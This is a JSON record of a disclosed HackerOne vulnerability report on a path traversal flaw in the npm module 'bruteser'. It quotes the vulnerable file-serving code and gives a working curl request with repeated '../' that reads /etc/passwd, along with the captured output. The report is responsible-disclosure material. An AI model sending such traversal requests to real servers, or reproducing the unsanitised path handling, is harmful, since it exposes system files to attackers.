{
  "id": 342066,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDIwNjY=",
  "url": "https://hackerone.com/reports/342066",
  "title": "[bruteser] Path Traversal allows to read content of arbitrary file",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-04-23T13:25:53.186Z",
  "submitted_at": "2018-04-23T13:25:53.186Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-07-04T19:41:30.036Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-07-04T19:41:21.046Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report Path Traversal in ```bruteser``` module.\nIt allows to read content of any arbitrary file from the server where ```bruteser``` is installed and run.\n\n## Module\n\n**module name:** bruteser\n**version:** 0.0.2\n**npm page:** https://www.npmjs.com/package/bruteser\n\n### Module Description\n\nBruteSer - server can be used for any type of static files. Just put your files to \"public\" folder, run server.js and access localhost:8080/your_file.html\n\nIf type localhost:8080 it will run index.html by default\n\n### Module Stats\n\nN/A, this module is new and rarely used, but I just wanted maintainer to be aware of the issue as the module is available in public npm directory.\n\n## Vulnerability Description\n\nPath Traversal vulnerability in bruteser module allows to go up in directory tree and read content of any file, like ```/etc/passwd```\n\nVulnerability exists, because ```bruteser``` uses variable ```filepath``` without any protection against Path Traversal attacks:\n\n```javascript\n// node_modules/bruteser/server.js, line 8 (some lines removed)\n\n\n\tvar filepath = req.url;\n\tif (filepath=='/') {\n\t\tvar filepath = '/index.html';\n\t}\n\n\tvar ext = path.extname(filepath);\n\n    // REMOVED\n\n\tfs.readFile('public'+filepath, function (err, data){\n\t\tif (err) {\n\t\t\tif (filepath === '/index.html') {\n\t\t\t\tres.end(\"It seems there is no index.html file in 'public' directory\");\n\t\t\t} else {\n\t\t\t\tres.end(\"There is no file by this address\");\n\t\t\t}\n\n\t\t\t\n\n\t\t}\n\t\tres.end(data);\n\t});\n   \n```\n\n\n## Steps To Reproduce:\n\nInstall ```bruteser``` module:\n\n```\n$ npm install bruteser\n```\n\nRun ```bruteser```:\n\n```\n$ node ./node_modules/bruteser/server.js \nServer is running on port 8080\n\n\n```\n\nRun following curl command to retrieve content of ```/etc/passwd``` (adjust amount of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://localhost:8080/../../../../../../../../etc/passwd\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n> GET /../../../../../../../../etc/passwd HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Date: Mon, 23 Apr 2018 13:15:43 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n(...)\nmysql:x:125:132:MySQL Server,,,:/nonexistent:/bin/false\n* Connection #0 to host localhost left intact\n```\n\n## Patch\n\n```filepath``` should be sanitized\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl 7.47.0\n\n## Wrap up\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows an attacker to read content of arbitrary files from the machine where ```bruteser``` is running",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-08-03T19:41:21.161Z",
  "allow_singular_disclosure_after": -174504098.15821394,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "apapedulimu",
    "wragg-s",
    "yousha12",
    "maks007",
    "chuprina"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 14634,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "bruteser",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
